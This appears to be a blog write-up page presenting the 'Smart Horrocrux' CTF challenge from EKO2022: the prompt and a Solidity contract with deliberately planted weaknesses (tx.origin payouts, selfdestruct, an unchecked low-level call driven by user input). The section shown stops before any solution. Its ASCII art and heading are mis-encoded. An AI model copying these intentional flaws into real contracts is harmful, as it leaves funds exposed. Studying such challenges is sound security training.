<h3 id="Smart-Horrocrux"><a href="#Smart-Horrocrux" class="headerlink" title="Smart Horrocrux"></a>Smart Horrocrux</h3><h4 id="1-question-4"><a href="#1-question-4" class="headerlink" title="1.question"></a>1.question</h4><blockquote>
<p>Some security researchers have recently found an eighth Horrocrux, it seems that Voldemort has link to a smart contract, can you destroy it?</p>
</blockquote>
<p><strong>æºç </strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">/// @title SmartHorrocrux</span><br><span class="line">/// @author https://twitter.com/AugustitoQ</span><br><span class="line">/// @notice Some security researchers have recently found an eighth Horrocrux, it seems that Voldemort has link to a smart contract, can you destroy it?</span><br><span class="line">/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/smart-horrocrux</span><br><span class="line">contract SmartHorrocrux &#123;</span><br><span class="line">    bool private invincible;</span><br><span class="line">    bytes32 private constant _spell = 0x45746865724b6164616272610000000000000000000000000000000000000000;</span><br><span class="line">    // var only for test purposes</span><br><span class="line">    bool public alive = true;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        require(msg.value == 2, &quot;Pay Horrorcrux creation price&quot;);</span><br><span class="line">        setInvincible();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function destroyIt(string memory spell, uint256 magic) public &#123;</span><br><span class="line">        bytes32 spellInBytes;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            spellInBytes := mload(add(spell, 32))</span><br><span class="line">        &#125;</span><br><span class="line">        require(spellInBytes == _spell, &quot;That spell wouldn&#x27;t kill a fly&quot;);</span><br><span class="line">        require(!invincible, &quot;The Horrocrux is still invincible&quot;);</span><br><span class="line"></span><br><span class="line">        bytes memory kedavra = abi.encodePacked(bytes4(bytes32(uint256(spellInBytes) - magic)));</span><br><span class="line">        address(this).call(kedavra);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function kill() external &#123;</span><br><span class="line">        require(msg.sender == address(this), &quot;No one can kill me&quot;);</span><br><span class="line">        alive = false;</span><br><span class="line">        selfdestruct(payable(tx.origin));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setInvincible() public &#123;</span><br><span class="line">        invincible = (address(this).balance == 1) ? false : true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        uint256 b = address(this).balance;</span><br><span class="line">        invincible = true;</span><br><span class="line">        if (b &gt; 0) &#123;</span><br><span class="line">            tx.origin.call&#123;value: b&#125;(&quot;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–’â–’â–‘â–’â–’â–‘â–‘â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–‘â–’â–ˆâ–ˆâ–“â–“â–’â–‘â–“â–ˆâ–ˆâ–ˆâ–ˆâ–‘â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–’â–’â–ˆâ–“â–ˆâ–’â–‘â–“â–‘â–“â–“â–“â–“â–‘â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–‘â–‘â–‘â–‘â–’â–‘â–“â–ˆâ–’â–‘â–‘â–’â–’â–‘â–‘â–“â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–ˆâ–“â–ˆâ–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–ˆâ–ˆâ–ˆâ–ˆâ–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–ˆâ–‘â–’â–ˆâ–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–ˆâ–’â–‘â–’â–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–“â–“â–’â–’â–ˆâ–ˆâ–ˆâ–“â–“â–“â–ˆâ–ˆâ–ˆâ–‘â–“â–“â–“â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–’â–‘â–“â–ˆâ–ˆâ–“â–ˆâ–ˆâ–ˆâ–“â–“â–“â–’â–‘â–‘â–“â–ˆâ–ˆâ–“â–ˆâ–“â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–ˆâ–’â–’â–“â–“â–ˆâ–ˆâ–ˆâ–“â–“â–’â–‘â–‘â–’â–’â–“â–ˆâ–ˆâ–’â–“â–’â–‘â–“â–ˆâ–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–“â–“â–’â–ˆâ–‘â–“â–ˆâ–ˆâ–“â–ˆâ–“â–’â–‘â–‘â–“â–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–“â–‘â–’â–ˆâ–ˆâ–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–“â–“â–’â–’â–’â–“â–“â–‘â–‘â–‘â–“â–“â–‘â–“â–’â–‘â–“â–‘â–‘â–“â–ˆâ–ˆâ–‘â–‘â–ˆâ–“â–“â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–‘â–‘â–‘â–’â–‘â–ˆâ–‘â–‘â–‘â–‘â–’â–’â–’â–’â–‘â–“â–’â–‘â–‘â–‘â–’â–ˆâ–‘â–“â–‘â–“â–“â–’â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ–ˆâ–‘â–’â–’â–“â–‘â–‘â–‘â–‘â–‘â–“â–ˆâ–‘â–‘â–“â–“â–‘â–‘â–‘â–‘â–“â–’â–’â–‘â–’â–‘â–’â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–“â–’â–‘â–“â–“â–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–“â–“â–‘â–“â–‘â–‘â–‘â–’â–‘â–’â–’â–“â–‘â–‘â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–“â–ˆâ–‘â–‘â–“â–ˆâ–“â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–‘â–‘â–“â–“â–’â–’â–‘â–’â–ˆâ–“â–‘â–‘â–“â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–“â–‘â–‘â–‘â–‘â–‘â–ˆâ–“â–“â–’â–’â–‘â–’â–ˆâ–“â–“â–’â–’â–“â–“â–’â–‘â–‘â–‘â–“â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–ˆâ–“â–“â–’â–’â–‘â–‘â–“â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–“â–“â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–ˆâ–ˆâ–ˆâ–“â–“â–ˆâ–’â–‘â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–“â–“â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–ˆâ–’â–’â–‘â–‘â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–“â–“â–ˆâ–ˆâ–’â–’â–“â–’â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–“â–’â–‘â–‘â–‘â–“â–“â–ˆâ–ˆâ–ˆâ–‘â–’â–ˆâ–‘â–‘â–ˆâ–ˆâ–“â–’â–’â–’â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–ˆâ–‘â–‘â–‘â–‘â–“â–‘â–‘â–‘â–ˆâ–ˆâ–’â–“â–’â–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆâ–“â–’â–’â–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–‘â–‘â–‘â–‘â–’â–’â–‘â–‘â–‘â–’â–“â–ˆâ–’â–“â–ˆâ–‘â–‘â–ˆâ–’â–’â–ˆâ–’â–“â–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–’â–‘â–‘â–‘â–’â–“â–‘â–‘â–‘â–‘â–ˆâ–“â–“â–“â–’â–’â–ˆâ–’â–‘â–‘â–“â–ˆâ–ˆâ–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–‘â–‘â–‘â–‘â–’â–“â–’â–’â–’â–ˆâ–“â–’â–’â–“â–ˆâ–’â–‘â–‘â–‘â–“â–ˆâ–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–“â–‘â–‘â–‘â–‘â–‘â–’â–ˆâ–ˆâ–“â–‘â–“â–ˆâ–ˆâ–‘â–‘â–’â–“â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–’â–“â–’â–’â–ˆâ–ˆâ–“â–“â–‘â–ˆâ–ˆâ–ˆâ–’â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–’â–“â–’â–“â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–“â–’â–‘â–‘â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–“â–‘â–“â–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–’â–‘â–‘â–“â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span 